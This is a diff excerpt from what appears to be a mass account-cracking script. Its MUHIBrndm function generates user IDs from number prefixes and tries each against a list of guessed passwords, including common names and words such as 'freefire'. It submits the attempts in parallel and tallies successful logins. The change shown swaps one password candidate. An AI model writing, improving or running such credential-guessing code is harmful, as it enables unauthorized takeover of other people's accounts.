@@ -149,7 +149,7 @@ def MUHIBrndm():
         __muhib__('\033[38;5;46m--------------------------------------------')
         for guru in user:
             uid = tithie+tithiex+tithi+guru
-            pwx = [tithie+tithiex+tithi+guru,kodeb+guru,kode+guru,tithie+tithiex+tithi,'freefire','@@###','@#@#@#','jannat','sadiya','tamanna','nusrat','lamiya']
+            pwx = [tithie+tithiex+tithi+guru,kode+guru,kode+guru,tithie+tithiex+tithi,'freefire','@@###','@#@#@#','jannat','sadiya','tamanna','nusrat','lamiya']
             MUHIB.submit(rcrack1,uid,pwx,tl)
     print(f'{G}--------------------------------------')
     print(' [×] FINISHED ------\033[1;92mTOTAL OK : %s'%len(oks))
